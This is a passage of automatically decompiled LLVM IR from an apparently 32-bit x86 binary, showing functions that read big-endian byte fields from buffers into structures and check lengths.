  %tmp9 = urem i8 %div5, 2
  %v1_80520e4 = zext i8 %tmp9 to i32
  %v1_80520e7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520e7 = add i32 %v1_80520e7, 16
  %v3_80520e7 = inttoptr i32 %v2_80520e7 to i32*
  store i32 %v1_80520e4, i32* %v3_80520e7, align 4
  %v0_80520ea = load i32, i32* @ecx, align 4
  %v1_80520ea = add i32 %v0_80520ea, 2
  %v2_80520ea = inttoptr i32 %v1_80520ea to i8*
  %v3_80520ea = load i8, i8* %v2_80520ea, align 1
  %tmp10 = urem i8 %v3_80520ea, 2
  %v1_80520ee = zext i8 %tmp10 to i32
  %v1_80520f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520f1 = add i32 %v1_80520f1, 20
  %v3_80520f1 = inttoptr i32 %v2_80520f1 to i32*
  store i32 %v1_80520ee, i32* %v3_80520f1, align 4
  %v0_80520f4 = load i32, i32* @ecx, align 4
  %v1_80520f4 = add i32 %v0_80520f4, 3
  %v2_80520f4 = inttoptr i32 %v1_80520f4 to i8*
  %v3_80520f4 = load i8, i8* %v2_80520f4, align 1
  %tmp11 = icmp slt i8 %v3_80520f4, 0
  %v2_80520f8 = zext i1 %tmp11 to i32
  %v1_80520fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520fb = add i32 %v1_80520fb, 24
  %v3_80520fb = inttoptr i32 %v2_80520fb to i32*
  store i32 %v2_80520f8, i32* %v3_80520fb, align 4
  %v0_80520fe = load i32, i32* @ecx, align 4
  %v1_80520fe = add i32 %v0_80520fe, 3
  %v2_80520fe = inttoptr i32 %v1_80520fe to i8*
  %v3_80520fe = load i8, i8* %v2_80520fe, align 1
  %tmp12 = urem i8 %v3_80520fe, 16
  %v1_8052102 = zext i8 %tmp12 to i32
  %v1_8052105 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052105 = add i32 %v1_8052105, 28
  %v3_8052105 = inttoptr i32 %v2_8052105 to i32*
  store i32 %v1_8052102, i32* %v3_8052105, align 4
  %v0_8052108 = load i32, i32* @ecx, align 4
  %v1_8052108 = add i32 %v0_8052108, 4
  %v2_8052108 = inttoptr i32 %v1_8052108 to i8*
  %v3_8052108 = load i8, i8* %v2_8052108, align 1
  %v4_8052108 = zext i8 %v3_8052108 to i32
  %v1_805210c = add i32 %v0_8052108, 5
  %v2_805210c = inttoptr i32 %v1_805210c to i8*
  %v3_805210c = load i8, i8* %v2_805210c, align 1
  %v4_805210c = zext i8 %v3_805210c to i32
  %v2_8052110 = mul nuw nsw i32 %v4_8052108, 256
  %v2_8052113 = or i32 %v4_805210c, %v2_8052110
  %v1_8052115 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052115 = add i32 %v1_8052115, 32
  %v3_8052115 = inttoptr i32 %v2_8052115 to i32*
  store i32 %v2_8052113, i32* %v3_8052115, align 4
  %v0_8052118 = load i32, i32* @ecx, align 4
  %v1_8052118 = add i32 %v0_8052118, 6
  %v2_8052118 = inttoptr i32 %v1_8052118 to i8*
  %v3_8052118 = load i8, i8* %v2_8052118, align 1
  %v4_8052118 = zext i8 %v3_8052118 to i32
  %v1_805211c = add i32 %v0_8052118, 7
  %v2_805211c = inttoptr i32 %v1_805211c to i8*
  %v3_805211c = load i8, i8* %v2_805211c, align 1
  %v4_805211c = zext i8 %v3_805211c to i32
  %v2_8052120 = mul nuw nsw i32 %v4_8052118, 256
  %v2_8052123 = or i32 %v4_805211c, %v2_8052120
  %v1_8052125 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052125 = add i32 %v1_8052125, 36
  %v3_8052125 = inttoptr i32 %v2_8052125 to i32*
  store i32 %v2_8052123, i32* %v3_8052125, align 4
  %v0_8052128 = load i32, i32* @ecx, align 4
  %v1_8052128 = add i32 %v0_8052128, 8
  %v2_8052128 = inttoptr i32 %v1_8052128 to i8*
  %v3_8052128 = load i8, i8* %v2_8052128, align 1
  %v4_8052128 = zext i8 %v3_8052128 to i32
  %v1_805212c = add i32 %v0_8052128, 9
  %v2_805212c = inttoptr i32 %v1_805212c to i8*
  %v3_805212c = load i8, i8* %v2_805212c, align 1
  %v4_805212c = zext i8 %v3_805212c to i32
  %v2_8052130 = mul nuw nsw i32 %v4_8052128, 256
  %v2_8052133 = or i32 %v4_805212c, %v2_8052130
  %v1_8052135 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052135 = add i32 %v1_8052135, 40
  %v3_8052135 = inttoptr i32 %v2_8052135 to i32*
  store i32 %v2_8052133, i32* %v3_8052135, align 4
  %v0_8052138 = load i32, i32* @ecx, align 4
  %v1_8052138 = add i32 %v0_8052138, 10
  %v2_8052138 = inttoptr i32 %v1_8052138 to i8*
  %v3_8052138 = load i8, i8* %v2_8052138, align 1
  %v4_8052138 = zext i8 %v3_8052138 to i32
  %v1_805213c = add i32 %v0_8052138, 11
  %v2_805213c = inttoptr i32 %v1_805213c to i8*
  %v3_805213c = load i8, i8* %v2_805213c, align 1
  %v4_805213c = zext i8 %v3_805213c to i32
  %v2_8052140 = mul nuw nsw i32 %v4_8052138, 256
  %v2_8052143 = or i32 %v4_805213c, %v2_8052140
  %v1_8052145 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052145 = add i32 %v1_8052145, 44
  %v3_8052145 = inttoptr i32 %v2_8052145 to i32*
  store i32 %v2_8052143, i32* %v3_8052145, align 4
  %v2_805214d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805214d, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 7, 8, 1, 2, 5, 6, 9, 3, 10, 11, 12, 13, 4, 14, 0 }
  uselistorder i32 40, { 4, 5, 9, 6, 7, 8, 2, 3, 10, 11, 12, 13, 1, 0 }
  uselistorder i32 7, { 8, 9, 2, 4, 6, 3, 0, 1, 7, 11, 12, 13, 14, 15, 10, 5 }
  uselistorder i32 6, { 14, 15, 0, 1, 7, 17, 3, 11, 8, 9, 6, 16, 18, 4, 5, 2, 10, 12, 13 }
  uselistorder i32 28, { 12, 13, 8, 9, 26, 30, 39, 21, 14, 15, 0, 16, 17, 18, 19, 20, 3, 4, 5, 1, 31, 7, 10, 11, 22, 27, 28, 23, 24, 32, 33, 34, 35, 36, 37, 2, 38, 40, 29, 6, 25 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 18, 6, 0, 19, 15, 7, 8, 9, 10, 11, 12, 16, 17, 13, 14 }
  uselistorder i8 8, { 0, 1, 3, 2, 4, 5, 6 }
}

define i32 @function_8052150() local_unnamed_addr {
dec_label_pc_8052150:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8052150 = load i32, i32* @edi, align 4
  %v0_8052151 = load i32, i32* @esi, align 4
  %v0_8052152 = load i32, i32* @ebx, align 4
  store i32 %v0_8052152, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_805215f = load i32, i32* @eax, align 4
  %v1_8052162 = inttoptr i32 %tmp to i32*
  %v2_8052162 = load i32, i32* %v1_8052162, align 4
  %v7_8052164 = inttoptr i32 %v2_8052162 to i8*
  %v8_8052164 = call i32 @function_8052694(i8* %v7_8052164, i32 %tmp2, i32 %tmp3, i32 %v0_805215f, i32 %v0_8052152, i32 %v0_8052151, i32 %v0_8052150)
  %v2_805216c = icmp slt i32 %v8_8052164, 0
  store i32 %v8_8052164, i32* @ecx, align 4
  br i1 %v2_805216c, label %dec_label_pc_805219d, label %dec_label_pc_8052172

dec_label_pc_8052172:                             ; preds = %dec_label_pc_8052150
  %v0_8052172 = load i32, i32* @ebx, align 4
  %v2_8052172 = sub i32 %v0_8052172, %v8_8052164
  %v1_8052174 = add i32 %v2_8052172, -3
  %v6_8052174 = sub i32 2, %v2_8052172
  %v7_8052174 = and i32 %v6_8052174, %v2_8052172
  %v8_8052174 = icmp slt i32 %v7_8052174, 0
  %v9_8052174 = icmp eq i32 %v1_8052174, 0
  %v10_8052174 = icmp slt i32 %v1_8052174, 0
  %v3_8052177 = icmp eq i1 %v10_8052174, %v8_8052174
  %v4_8052177 = icmp eq i1 %v9_8052174, false
  %v5_8052177 = and i1 %v4_8052177, %v3_8052177
  br i1 %v5_8052177, label %dec_label_pc_805217e, label %dec_label_pc_8052179

dec_label_pc_8052179:                             ; preds = %dec_label_pc_8052172
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_805219d

dec_label_pc_805217e:                             ; preds = %dec_label_pc_8052172
  %v0_805217e = load i32, i32* @edi, align 4
  %v2_805217e = add i32 %v0_805217e, %v8_8052164
  store i32 %v2_805217e, i32* @edx, align 4
  %v0_8052181 = load i32, i32* @esi, align 4
  %v1_8052181 = add i32 %v0_8052181, 5
  %v2_8052181 = inttoptr i32 %v1_8052181 to i8*
  %v3_8052181 = load i8, i8* %v2_8052181, align 1
  %v1_8052185 = add i32 %v8_8052164, 4
  store i32 %v1_8052185, i32* @ecx, align 4
  %v3_8052188 = inttoptr i32 %v2_805217e to i8*
  store i8 %v3_8052181, i8* %v3_8052188, align 1
  %v0_805218a = load i32, i32* @esi, align 4
  %v1_805218a = add i32 %v0_805218a, 4
  %v2_805218a = inttoptr i32 %v1_805218a to i32*
  %v3_805218a = load i32, i32* %v2_805218a, align 4
  %v1_805218d = trunc i32 %v3_805218a to i8
  %v2_805218d = load i32, i32* @edx, align 4
  %v3_805218d = add i32 %v2_805218d, 1
  %v4_805218d = inttoptr i32 %v3_805218d to i8*
  store i8 %v1_805218d, i8* %v4_805218d, align 1
  %v0_8052190 = load i32, i32* @esi, align 4
  %v1_8052190 = add i32 %v0_8052190, 9
  %v2_8052190 = inttoptr i32 %v1_8052190 to i8*
  %v3_8052190 = load i8, i8* %v2_8052190, align 1
  %v2_8052194 = load i32, i32* @edx, align 4
  %v3_8052194 = add i32 %v2_8052194, 2
  %v4_8052194 = inttoptr i32 %v3_8052194 to i8*
  store i8 %v3_8052190, i8* %v4_8052194, align 1
  %v0_8052197 = load i32, i32* @esi, align 4
  %v1_8052197 = add i32 %v0_8052197, 8
  %v2_8052197 = inttoptr i32 %v1_8052197 to i32*
  %v3_8052197 = load i32, i32* %v2_8052197, align 4
  %v1_805219a = trunc i32 %v3_8052197 to i8
  %v2_805219a = load i32, i32* @edx, align 4
  %v3_805219a = add i32 %v2_805219a, 3
  %v4_805219a = inttoptr i32 %v3_805219a to i8*
  store i8 %v1_805219a, i8* %v4_805219a, align 1
  %v0_805219e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805219d

dec_label_pc_805219d:                             ; preds = %dec_label_pc_8052150, %dec_label_pc_8052179, %dec_label_pc_805217e
  %v0_805219e = phi i32 [ %v8_8052164, %dec_label_pc_8052150 ], [ -1, %dec_label_pc_8052179 ], [ %v0_805219e.pre, %dec_label_pc_805217e ]
  %v2_805219d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805219d, i32* @ebx, align 4
  store i32 %v0_8052150, i32* @edi, align 4
  ret i32 %v0_805219e

; uselistorder directives
  uselistorder i32 %v1_8052174, { 1, 0 }
  uselistorder i32 %v2_8052172, { 0, 2, 1 }
  uselistorder i32 %v8_8052164, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 5, 0 }
  uselistorder label %dec_label_pc_805219d, { 2, 1, 0 }
}

define i32 @function_80521a4() local_unnamed_addr {
dec_label_pc_80521a4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_80521af = call i32 @function_8052800(i32 %tmp, i32 %tmp1)
  %v2_80521b4 = icmp slt i32 %v2_80521af, 0
  %v1_80521b6 = add i32 %v2_80521af, 4
  %v1_80521b9 = icmp eq i1 %v2_80521b4, false
  %v4_80521b9 = select i1 %v1_80521b9, i32 %v1_80521b6, i32 %v2_80521af
  ret i32 %v4_80521b9

; uselistorder directives
  uselistorder i32 %v2_80521af, { 1, 0, 2 }
}

define i32 @function_80521c0() local_unnamed_addr {
dec_label_pc_80521c0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80521c0 = load i32, i32* @ebp, align 4
  %v0_80521c1 = load i32, i32* @edi, align 4
  %v0_80521c2 = load i32, i32* @esi, align 4
  %v0_80521c3 = load i32, i32* @ebx, align 4
  store i32 %v0_80521c3, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80521e4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80521e4, i32* %eax.global-to-local, align 4
  %v4_80521f1 = call i32 @function_8052724(i32 %tmp4, i32 %tmp7, i32 %v2_80521e4, i32 256)
  store i32 %v4_80521f1, i32* %eax.global-to-local, align 4
  %v3_80521f9 = icmp slt i32 %v4_80521f1, 0
  store i32 %v4_80521f1, i32* @edi, align 4
  br i1 %v3_80521f9, label %dec_label_pc_80522ac, label %dec_label_pc_8052203

dec_label_pc_8052203:                             ; preds = %dec_label_pc_80521c0
  %v0_8052203 = load i32, i32* @ebx, align 4
  %v3_8052203 = add i32 %v0_8052203, %v4_80521f1
  %v0_8052205 = load i32, i32* @esi, align 4
  %v2_8052205 = sub i32 %v0_8052205, %v3_8052203
  %v1_8052207 = add i32 %v2_8052205, -10
  %v10_8052207 = icmp slt i32 %v1_8052207, 0
  store i32 %v1_8052207, i32* @esi, align 4
  %v1_8052212 = icmp eq i1 %v10_8052207, false
  br i1 %v1_8052212, label %dec_label_pc_805221b, label %dec_label_pc_8052214

dec_label_pc_8052214:                             ; preds = %dec_label_pc_8052203
  br label %dec_label_pc_80522ac

dec_label_pc_805221b:                             ; preds = %dec_label_pc_8052203
  %v6_8052222 = add i32 %v3_8052203, %tmp4
  store i32 %v6_8052222, i32* @ebx, align 4
  store i32 %v2_80521e4, i32* %eax.global-to-local, align 4
  %v1_805222e = call i32 @function_804d694(i32 %v2_80521e4)
  store i32 %v1_805222e, i32* %eax.global-to-local, align 4
  %v0_8052233 = load i32, i32* @ebx, align 4
  %v1_8052233 = add i32 %v0_8052233, 4
  store i32 %v1_8052233, i32* %esi.global-to-local, align 4
  %v1_8052236 = load i32, i32* @ebp, align 4
  %v2_8052236 = inttoptr i32 %v1_8052236 to i32*
  store i32 %v1_805222e, i32* %v2_8052236, align 4
  %v0_8052239 = load i32, i32* @ebx, align 4
  %v1_8052239 = inttoptr i32 %v0_8052239 to i8*
  %v2_8052239 = load i8, i8* %v1_8052239, align 1
  %v3_8052239 = zext i8 %v2_8052239 to i32
  store i32 %v3_8052239, i32* %eax.global-to-local, align 4
  %v1_805223c = add i32 %v0_8052239, 1
  %v2_805223c = inttoptr i32 %v1_805223c to i8*
  %v3_805223c = load i8, i8* %v2_805223c, align 1
  %v4_805223c = zext i8 %v3_805223c to i32
  store i32 %v4_805223c, i32* %edx.global-to-local, align 4
  %v2_8052240 = mul nuw nsw i32 %v3_8052239, 256
  %v2_8052243 = or i32 %v4_805223c, %v2_8052240
  store i32 %v2_8052243, i32* %eax.global-to-local, align 4
  %v1_8052245 = load i32, i32* @ebp, align 4
  %v2_8052245 = add i32 %v1_8052245, 4
  %v3_8052245 = inttoptr i32 %v2_8052245 to i32*
  store i32 %v2_8052243, i32* %v3_8052245, align 4
  %v0_8052248 = load i32, i32* @ebx, align 4
  %v1_8052248 = add i32 %v0_8052248, 2
  %v2_8052248 = inttoptr i32 %v1_8052248 to i8*
  %v3_8052248 = load i8, i8* %v2_8052248, align 1
  %v4_8052248 = zext i8 %v3_8052248 to i32
  store i32 %v4_8052248, i32* %eax.global-to-local, align 4
  %v1_805224c = add i32 %v0_8052248, 3
  %v2_805224c = inttoptr i32 %v1_805224c to i8*
  %v3_805224c = load i8, i8* %v2_805224c, align 1
  %v4_805224c = zext i8 %v3_805224c to i32
  store i32 %v4_805224c, i32* %edx.global-to-local, align 4
  %v2_8052250 = mul nuw nsw i32 %v4_8052248, 256
  %v2_8052253 = or i32 %v4_805224c, %v2_8052250
  store i32 %v2_8052253, i32* %eax.global-to-local, align 4
  %v1_8052255 = load i32, i32* @ebp, align 4
  %v2_8052255 = add i32 %v1_8052255, 8
  %v3_8052255 = inttoptr i32 %v2_8052255 to i32*
  store i32 %v2_8052253, i32* %v3_8052255, align 4
  %v0_8052258 = load i32, i32* @ebx, align 4
  %v1_8052258 = add i32 %v0_8052258, 4
  %v2_8052258 = inttoptr i32 %v1_8052258 to i8*
  %v3_8052258 = load i8, i8* %v2_8052258, align 1
  %v4_8052258 = zext i8 %v3_8052258 to i32
  store i32 %v4_8052258, i32* %edx.global-to-local, align 4
  %v0_805225c = load i32, i32* %esi.global-to-local, align 4
  %v1_805225c = add i32 %v0_805225c, 1
  %v2_805225c = inttoptr i32 %v1_805225c to i8*
  %v3_805225c = load i8, i8* %v2_805225c, align 1
  %v4_805225c = zext i8 %v3_805225c to i32
  store i32 %v4_805225c, i32* %eax.global-to-local, align 4
  %v1_8052260 = add i32 %v0_805225c, 2
  %v2_8052260 = inttoptr i32 %v1_8052260 to i8*
  %v3_8052260 = load i8, i8* %v2_8052260, align 1
  %v4_8052260 = zext i8 %v3_8052260 to i32
  %v2_8052264 = mul nuw i32 %v4_8052258, 16777216
  %v2_8052267 = mul nuw nsw i32 %v4_805225c, 65536
  store i32 %v2_8052267, i32* %eax.global-to-local, align 4
  %v2_805226a = or i32 %v2_8052267, %v2_8052264
  store i32 %v2_805226a, i32* %edx.global-to-local, align 4
  %v1_805226c = add i32 %v0_805225c, 3
  %v2_805226c = inttoptr i32 %v1_805226c to i8*
  %v3_805226c = load i8, i8* %v2_805226c, align 1
  %v4_805226c = zext i8 %v3_805226c to i32
  store i32 %v4_805226c, i32* %eax.global-to-local, align 4
  %v2_8052270 = mul nuw nsw i32 %v4_8052260, 256
  %v2_8052273 = or i32 %v4_805226c, %v2_805226a
  store i32 %v2_8052273, i32* %edx.global-to-local, align 4
  %v2_8052275 = or i32 %v2_8052273, %v2_8052270
  store i32 %v2_8052275, i32* @ecx, align 4
  %v1_8052277 = load i32, i32* @ebp, align 4
  %v2_8052277 = add i32 %v1_8052277, 12
  %v3_8052277 = inttoptr i32 %v2_8052277 to i32*
  store i32 %v2_8052275, i32* %v3_8052277, align 4
  %v0_805227a = load i32, i32* @ebx, align 4
  %v1_805227a = add i32 %v0_805227a, 8
  %v2_805227a = inttoptr i32 %v1_805227a to i8*
  %v3_805227a = load i8, i8* %v2_805227a, align 1
  %v4_805227a = zext i8 %v3_805227a to i32
  store i32 %v4_805227a, i32* %edx.global-to-local, align 4
  %v1_805227e = add i32 %v0_805227a, 9
  %v2_805227e = inttoptr i32 %v1_805227e to i8*
  %v3_805227e = load i8, i8* %v2_805227e, align 1
  %v4_805227e = zext i8 %v3_805227e to i32
  store i32 %v4_805227e, i32* %eax.global-to-local, align 4
  %v1_8052282 = add i32 %v0_805227a, 10
  %v1_8052285 = load i32, i32* @ebp, align 4
  %v2_8052285 = add i32 %v1_8052285, 20
  %v3_8052285 = inttoptr i32 %v2_8052285 to i32*
  store i32 %v1_8052282, i32* %v3_8052285, align 4
  %v0_8052288 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052288 = mul i32 %v0_8052288, 256
  %v1_805228b = load i32, i32* %eax.global-to-local, align 4
  %v2_805228b = or i32 %v1_805228b, %v2_8052288
  store i32 %v2_805228b, i32* @edx, align 4
  %v1_805228d = load i32, i32* @ebp, align 4
  %v2_805228d = add i32 %v1_805228d, 16
  %v3_805228d = inttoptr i32 %v2_805228d to i32*
  store i32 %v2_805228b, i32* %v3_805228d, align 4
  %v1_8052297 = add i32 %v3_8052203, 10
  store i32 %v1_8052297, i32* %eax.global-to-local, align 4
  %v1_805229a = load i32, i32* @ebp, align 4
  %v2_805229a = add i32 %v1_805229a, 24
  %v3_805229a = inttoptr i32 %v2_805229a to i32*
  store i32 %v1_8052297, i32* %v3_805229a, align 4
  %v4_805229d = load i32, i32* @edx, align 4
  %v5_80522a1 = icmp slt i32 %v1_8052207, %v4_805229d
  br i1 %v5_80522a1, label %dec_label_pc_80522a3, label %dec_label_pc_80522a8

dec_label_pc_80522a3:                             ; preds = %dec_label_pc_805221b
  br label %dec_label_pc_80522ac

dec_label_pc_80522a8:                             ; preds = %dec_label_pc_805221b
  %v1_80522a8 = load i32, i32* @edi, align 4
  %v2_80522a8 = add i32 %v4_805229d, 10
  %v3_80522a8 = add i32 %v2_80522a8, %v1_80522a8
  br label %dec_label_pc_80522ac

dec_label_pc_80522ac:                             ; preds = %dec_label_pc_80521c0, %dec_label_pc_80522a3, %dec_label_pc_8052214, %dec_label_pc_80522a8
  %v0_80522b2 = phi i32 [ %v4_80521f1, %dec_label_pc_80521c0 ], [ -1, %dec_label_pc_80522a3 ], [ %v1_8052207, %dec_label_pc_8052214 ], [ %v3_80522a8, %dec_label_pc_80522a8 ]
  store i32 %v0_80522b2, i32* %eax.global-to-local, align 4
  %v2_80522b4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80522b4, i32* @ebx, align 4
  store i32 %v0_80521c2, i32* @esi, align 4
  store i32 %v0_80521c1, i32* @edi, align 4
  store i32 %v0_80521c0, i32* @ebp, align 4
  ret i32 %v0_80522b2

; uselistorder directives
  uselistorder i32 %v0_80522b2, { 1, 0 }
  uselistorder i32 %v2_8052267, { 1, 0 }
  uselistorder i32 %v1_8052207, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052203, { 1, 0, 2 }
  uselistorder i32 %v4_80521f1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_80521e4, { 1, 2, 0, 3 }
  uselistorder i32 24, { 7, 8, 15, 0, 9, 10, 11, 16, 2, 3, 14, 4, 5, 6, 12, 17, 18, 19, 20, 21, 22, 23, 24, 1, 13 }
  uselistorder i32 20, { 17, 18, 19, 22, 2, 26, 20, 6, 21, 23, 24, 3, 27, 28, 0, 11, 12, 16, 13, 14, 15, 29, 30, 31, 32, 33, 7, 34, 35, 36, 25, 4, 8, 5, 9, 10, 1 }
  uselistorder i32 9, { 8, 9, 10, 11, 2, 12, 3, 13, 14, 1, 5, 0, 15, 16, 17, 18, 4, 6, 7 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 9, 7, 10, 8, 12, 11, 13 }
  uselistorder i32 3, { 34, 35, 36, 37, 38, 39, 21, 0, 13, 1, 22, 2, 17, 42, 3, 40, 23, 5, 4, 6, 10, 11, 9, 24, 14, 25, 32, 20, 26, 7, 33, 27, 41, 18, 19, 28, 8, 15, 16, 12, 29, 30, 31 }
  uselistorder i32 (i32)* @function_804d694, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_80522ac, { 3, 1, 2, 0 }
}

define i32 @function_80522bc() local_unnamed_addr {
dec_label_pc_80522bc:
  %v3_80522c9 = call i32 @function_804bbbc(i32 ptrtoint ([11 x i8]* @global_var_8055085.211 to i32), i32 ptrtoint (i32* @global_var_8055050.199 to i32))
  store i32 %v3_80522c9, i32* @eax, align 4
  %v1_80522d1 = icmp eq i32 %v3_80522c9, 0
  %v1_80522d3 = icmp eq i1 %v1_80522d1, false
  br i1 %v1_80522d3, label %dec_label_pc_80522e9, label %dec_label_pc_80522d5

dec_label_pc_80522d5:                             ; preds = %dec_label_pc_80522bc
  %v3_80522e1 = call i32 @function_804bbbc(i32 ptrtoint ([18 x i8]* @global_var_8055090.212 to i32), i32 ptrtoint (i32* @global_var_8055050.199 to i32))
  br label %dec_label_pc_80522e9

dec_label_pc_80522e9:                             ; preds = %dec_label_pc_80522bc, %dec_label_pc_80522d5
  %v0_80522ec = phi i32 [ %v3_80522c9, %dec_label_pc_80522bc ], [ %v3_80522e1, %dec_label_pc_80522d5 ]
  ret i32 %v0_80522ec

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804bbbc, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055050.199 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80522e9, { 1, 0 }
}

define i32 @function_80522ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_80522ed:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80522ed = load i32, i32* @ebp, align 4
  %v0_80522ee = load i32, i32* @edi, align 4
  %v0_80522ef = load i32, i32* @esi, align 4
  %v0_80522f0 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80522fe = sub i32 0, %arg6
  %v1_8052300 = urem i32 %v1_80522fe, 4
  %v2_8052300 = icmp eq i32 %v1_8052300, 0
  store i32 %v1_8052300, i32* %eax.global-to-local, align 4
  br i1 %v2_8052300, label %dec_label_pc_8052311, label %dec_label_pc_8052305

dec_label_pc_8052305:                             ; preds = %dec_label_pc_80522ed
  %v2_8052305 = sub i32 %arg7, %v1_8052300
  %v7_8052305 = icmp ugt i32 %v1_8052300, %arg7
  br i1 %v7_8052305, label %dec_label_pc_80525b5, label %dec_label_pc_805230d

dec_label_pc_805230d:                             ; preds = %dec_label_pc_8052305
  %v2_805230d = add i32 %v1_8052300, %arg6
  store i32 %v2_805230d, i32* @ebx, align 4
  store i32 %v2_8052305, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052311

dec_label_pc_8052311:                             ; preds = %dec_label_pc_80522ed, %dec_label_pc_805230d
  %v0_805231f = phi i32 [ %arg6, %dec_label_pc_80522ed ], [ %v2_805230d, %dec_label_pc_805230d ]
  %v0_8052326 = phi i32 [ %arg7, %dec_label_pc_80522ed ], [ %v2_8052305, %dec_label_pc_805230d ]
  %tmp = icmp ult i32 %v0_8052326, 32
  br i1 %tmp, label %dec_label_pc_80525b5, label %dec_label_pc_805231a

dec_label_pc_805231a:                             ; preds = %dec_label_pc_8052311
  %v12_805231a = icmp eq i32 %arg4, 1
  %v1_805231f = add i32 %v0_805231f, 32
  store i32 %v1_805231f, i32* %eax.global-to-local, align 4
  %v1_8052326 = add i32 %v0_8052326, -32
  store i32 %v1_8052326, i32* @ebp, align 4
  br i1 %v12_805231a, label %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge, label %dec_label_pc_805232f

dec_label_pc_805231a.dec_label_pc_8052465_crit_edge: ; preds = %dec_label_pc_805231a
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8052465

dec_label_pc_805232f:                             ; preds = %dec_label_pc_805231a
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8052336 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8052336, align 4
  %tmp140 = icmp ult i32 %v1_8052326, 4
  br i1 %tmp140, label %dec_label_pc_80525b5, label %dec_label_pc_8052342

dec_label_pc_8052342:                             ; preds = %dec_label_pc_805232f
  %v0_8052342 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052342 = add i32 %v0_8052342, -36
  store i32 %v1_8052342, i32* %eax.global-to-local, align 4
  %tmp141 = icmp ult i32 %v1_8052342, 8
  br i1 %tmp141, label %dec_label_pc_80525b5, label %dec_label_pc_805234e

dec_label_pc_805234e:                             ; preds = %dec_label_pc_8052342
  %v0_805234e = load i32, i32* @ebp, align 4
  %tmp142 = icmp ult i32 %v0_805234e, 16
  br i1 %tmp142, label %dec_label_pc_80525b5, label %dec_label_pc_8052357

dec_label_pc_8052357:                             ; preds = %dec_label_pc_805234e
  %v1_8052357 = add i32 %v0_8052342, -48
  store i32 %v1_8052357, i32* %eax.global-to-local, align 4
  %tmp143 = icmp ult i32 %v1_8052357, 8
  br i1 %tmp143, label %dec_label_pc_80525b5, label %dec_label_pc_8052363

dec_label_pc_8052363:                             ; preds = %dec_label_pc_8052357
  %v0_8052363 = load i32, i32* @ebx, align 4
  %v1_8052363 = add i32 %v0_8052363, 48
  %v1_8052366 = add i32 %v0_8052342, -44
  store i32 %v1_8052366, i32* @ebp, align 4
  %v1_805236d = add i32 %v0_8052342, -56
  store i32 %v1_805236d, i32* @eax, align 4
  %v7_8052370 = icmp ult i32 %v1_805236d, %v1_8052366
  %v1_8052372 = add i32 %v0_8052363, 36
  store i32 %v1_8052372, i32* @edi, align 4
  br i1 %v7_8052370, label %dec_label_pc_805237c, label %dec_label_pc_8052377

dec_label_pc_8052377:                             ; preds = %dec_label_pc_8052363
  %v1_8052377 = add i32 %v0_8052363, 44
  store i32 %v1_8052377, i32* @esi, align 4
  br label %dec_label_pc_8052381

dec_label_pc_805237c:                             ; preds = %dec_label_pc_8052363
  %v1_805237c = add i32 %v0_8052363, 56
  store i32 %v1_805237c, i32* @esi, align 4
  store i32 %v1_805236d, i32* @ebp, align 4
  br label %dec_label_pc_8052381

dec_label_pc_8052381:                             ; preds = %dec_label_pc_8052377, %dec_label_pc_805237c
  %v0_8052381 = phi i32 [ %v1_8052366, %dec_label_pc_8052377 ], [ %v1_805236d, %dec_label_pc_805237c ]
  %tmp144 = icmp ult i32 %v0_8052381, 80
